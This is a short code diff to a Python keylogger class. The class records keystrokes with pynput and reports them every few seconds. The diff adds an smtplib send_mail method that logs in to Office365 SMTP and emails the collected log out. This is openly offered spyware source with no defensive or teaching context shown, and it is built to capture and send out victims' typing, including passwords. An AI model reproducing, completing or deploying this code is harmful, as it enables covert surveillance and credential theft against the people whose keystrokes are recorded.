@@ -3,6 +3,7 @@
 
 import pynput.keyboard # This library allows to monitor mouse clicks and keyboard strokes.
 import threading
+import smtplib
 
 class Keylogger:
 
@@ -27,6 +28,13 @@ class Keylogger:
         self.log = ""
         timer = threading.Timer(5, self.report)
         timer.start()
+
+    def send_mail(self, email, password, message):
+        server = smtplib.SMTP("smtp.office365.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
 
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
